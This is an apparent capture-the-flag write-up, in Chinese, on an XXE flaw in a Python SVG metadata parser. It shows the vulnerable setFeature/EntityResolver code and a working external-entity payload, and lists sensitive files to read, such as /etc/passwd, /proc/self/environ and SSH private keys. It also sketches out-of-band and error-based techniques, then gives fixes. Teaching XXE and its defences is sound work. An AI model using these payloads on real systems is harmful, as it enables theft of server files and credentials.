# SVG 元数据提取处的 XXE

## 这一题在教什么

**「默认安全」不等于「用起来安全」。**

Python 的 `xml` 模块默认**不解析外部实体** —— 这是它刻意做的一个安全默认值。
这一题的洞完全是因为有人把那道闸门打开了。

真实世界里的 XXE 几乎都是这么来的：

- 开发想支持"可引入的片段"，于是打开了外部实体
- 觉得标准库"不够灵活"，换了一个默认更宽松的解析器
- 从 StackOverflow 抄了一段代码，没注意里面有一行 `setFeature(...)`

## 漏洞在哪

`module.py` 里有两处，**必须两个都在**才构成 XXE：

```python
# 一、把默认的安全值改掉了
parser.setFeature(feature_external_ges, True)

# 二、自己实现了"按 SYSTEM 给的路径去读文件"
class SvgMetadata(EntityResolver):
    def resolveEntity(self, publicId, systemId):
        ...
        with open(path, "rb") as handle:
            return io.BytesIO(handle.read(MAX_EXPANDED))
```

- 只开 feature 不实现 resolver → expat 走默认行为，读不到
- 只实现 resolver 不开 feature → expat 根本不会去问

**注解里那句 `#: 默认就是 False（不解析外部实体）` 就是这一题的全部。**
一行 `setFeature`，把整个 XML 解析面从"只读数据"变成了"能读服务器文件"。

## 怎么打通

### 第一步：一个最小的外部实体

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <title>&xxe;</title>
  <author>test</author>
</svg>
```

传上去。如果标题那一栏显示了 `/etc/hostname` 的内容 —— 通了。

**为什么读得到**：`&xxe;` 在 `<title>` 里被引用了，解析器必须知道它是什么，
于是拿 `SYSTEM` 后面的标识符去问 `resolveEntity`。而 `resolveEntity` 直接
`open()` 了它。

### 第二步：读这一题的目标文件

页面下半部分给了完整路径：

```xml
<!ENTITY xxe SYSTEM "file://<目标文件的完整路径>">
```

那串 `ICON-OPS-` 开头的凭据出现在标题里就通关了。

### 还能读什么

```
file:///etc/passwd                    用户列表
file:///etc/hostname                  主机名（先拿它验证漏洞存在）
file:///proc/self/environ             环境变量（常常有密钥、数据库口令）
file:///proc/self/cmdline             启动参数
file:///proc/self/cwd/config.py       应用自己的配置
file:///root/.ssh/id_rsa              私钥
file:///var/log/...                   日志
```

`/proc/self/*` 那几个特别值得记住：它们是**进程自己的视角**，
所以不用担心路径猜错，而且经常能捞到环境变量里的凭据。

## 这一题做不到的：参数实体那一套

值得明确说清楚，省得你以为是自己的 payload 写错了：

**expat 不支持外部参数实体。** 实测：

```
setFeature(feature_external_pes, True)
→ SAXNotSupportedException: expat does not read external parameter entities
```

所以这些经典手法在**这套栈上**不成立：

| 手法 | 为什么不行 |
|---|---|
| Blind XXE（不出网、不回显，靠参数实体外带） | 需要外部参数实体 |
| OOB XXE（让服务端把文件发到你的服务器） | 同上 |
| Error-based XXE（用解析报错把内容带出来） | 同上 |
| Billion Laughs（实体递归膨胀） | **这个能做** —— 普通实体就能递归展开（这一题加了 `MAX_EXPANDED` 兜住） |

这一题能做的是**带内读取**：读到的内容直接显示在响应里。
真实环境里遇到"不回显"的目标才需要参数实体那一套，那时候的思路是：

1. 让服务端把数据发到你控制的服务器上（需要出网）
2. 故意制造解析错误，把文件内容拼进报错消息里
3. 用 `php://filter` 之类协议把内容编码后带出来（**PHP 专属，Python 没有**）

## 怎么修

**一、不要打开外部实体。（这一题只要删一行）**

```python
parser.setFeature(feature_external_ges, False)
```

**二、用默认就安全的解析器。**

| 解析器 | 外部实体默认行为 |
|---|---|
| `xml.etree.ElementTree` | 不解析（安全） |
| `xml.sax` + 默认 feature | 不解析（安全） |
| `xml.dom.minidom` | 不解析（安全） |
| `lxml` | 默认不解析，但可以打开；老版本有坑 |
| `defusedxml` | **专门为这个场景做的**，会主动拒绝 |
| Java 的 `DocumentBuilderFactory` | **默认解析** —— 所以 Java 生态 XXE 特别多 |

```python
# 最省事的做法
import defusedxml.ElementTree as ET
tree = ET.fromstring(blob)          # 遇到 DTD / 外部实体直接拒绝
```

**三、解析之前先禁止 DTD。**

外部实体必须先声明 `<!DOCTYPE>`。所以"干脆不允许 DOCTYPE"是一个很有效的
一刀切做法：

```python
if b"<!DOCTYPE" in blob.upper():
    abort(400)
```

**但这是黑名单式的** —— 注意 `<!DOCTYPE` 可以用参数实体、外部 DTD 等方式变体，
所以它是补充手段，不是修复。

**四、解析器不该有能力读文件系统。**

这一条是纵深防御：如果那个进程在容器里、只挂载了它需要的那几个目录，
`file:///etc/shadow` 就是读不到的。XXE 的危害从"读任意文件"降到"读不到什么"。

**五、限制资源。**

这一题加了 `MAX_UPLOAD`（上传大小）和 `MAX_EXPANDED`（展开后大小）。
后者是防 Billion Laughs 的 —— 十个嵌套实体，每个引用十次前一个，
几 KB 的文档能展开成几 GB。

## 顺手想想

- 如果 `resolveEntity` 里加了一句"只允许 `https://` 开头的标识符"，
  这一题变成什么漏洞了？（提示：服务端拿你给的 URL 去抓东西）
- 为什么 Java 生态里 XXE 特别多，而 Python 里相对少？
- `<!DOCTYPE` 黑名单怎么绕？（提示：DTD 也可以来自外部文件）
- 如果这一题的目标不是"读文件"而是"让服务器发出一个请求"，
  那个请求会打到哪？（想想 OOB 为什么对盲注目标特别有用）
